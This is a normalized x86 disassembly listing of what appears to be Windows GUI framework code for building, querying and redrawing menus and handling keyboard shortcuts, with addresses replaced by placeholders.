call sub_45e2e8
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407d58
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403f0c
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c4e0
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c4e0
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_45b840
push eax
mov edx esi
mov eax ebx
call sub_45b840
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_4043d8
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407d58
push ebp
mov eax [ ebp - 0x2c ]
call sub_45c1dc
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_45c1dc
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c4e0
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_403f50
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45b840
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_45b840
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_45e254
mov edx [ ebp - 0x40 ]
pop eax
call sub_403f0c
mov edx esi
mov eax ebx
call sub_45b840
push eax
mov edx esi
mov eax ebx
call sub_45b840
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_404178
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_4043d8
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_45c290
mov eax [ ebp - 0x18 ]
call sub_404178
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404418
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404460
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_45c290
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_45c8ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45b830
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45b830
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45ca70
test al al
je r-xdata
mov eax esi
call sub_45b830
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45b840
call sub_45c8c8
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_45b840
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45b840
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45b840
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45b840
call sub_45c8c8
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45b840
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45b840
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45b840
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_45b840
call sub_45c8c8
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_45ca44
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_45ca44
and eax 0x7f
mov al [ eax + rw-data ]
sub_45ca70
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_45ca70
and eax 0x7f
mov al [ eax + rw-data ]
sub_45ca9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_459784
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_420d38
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_45d7c8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_45cb38
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403128
mov eax [ esi + 0x44 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420d84
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_45cbac
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45cbac
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_4592f0
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45bc34
mov eax ebx
pop esi
pop ebx
retn
sub_45cbec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_45b830
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_45b840
call sub_45cbec
pop ecx
test al al
je r-xdata
sub_45cc84
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_45cbec
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_4592f0
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_45ccb4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_45cc84
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_45dfd8
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_45cd24
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_45cc84
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_45cd40
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_45cc84
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_45c3f0
mov ebx eax
xor edx edx
mov eax edi
call sub_45c8ec
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_45bd58
mov eax [ esi + 0x34 ]
call sub_45bd58
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_459c94
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_44f7d8
push eax
call DrawMenuBar
sub_45ce2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_45ce2c
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_45cf51
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_45cc84
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45bd58
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_45ce1c
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_45cf80
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42bc64
xor eax eax
push ebp
push sub_45d07e
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42bc64
xor eax eax
push ebp
push sub_45d053
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_45ce2c
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42bc5c
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d085
mov eax [ rw-data ]
call sub_42bc5c
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_45cc84
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_45d0a4
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_45d428
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_45d428
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_45d160
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_45d6fc
mov eax ebx
call sub_408884
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_45d200
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_45d160
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404128
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_404378
lea edx [ ebp - 0x200 ]
call sub_408948
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45d294
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_45d304
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45d7a4
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45d7a4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_45d7a4
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_45d310
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_45d200
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_45d294
mov eax ebx
call sub_45d7c8
jmp r-xdata
sub_45d378
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45d3c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_4575f0
mov eax ebx
call sub_45cbd4
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_457634
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_420e08
sub_45d3fc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_421054
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_45d3c0
sub_45d440
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45cc84
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_45cc84
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_460768
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_45d49c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_45d571
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45cc84
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_45cc84
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45b830
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45b840
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_4040a0
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_4040a0
mov eax [ ebp - 0xc ]
pop edx
call sub_407f38
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_45e2e8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d578
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403edc
retn
sub_45d584
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45d440
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45d49c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_45d6fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_45ce08
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_45cc84
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_45cc84
mov [ ebp - 0x4 ] eax
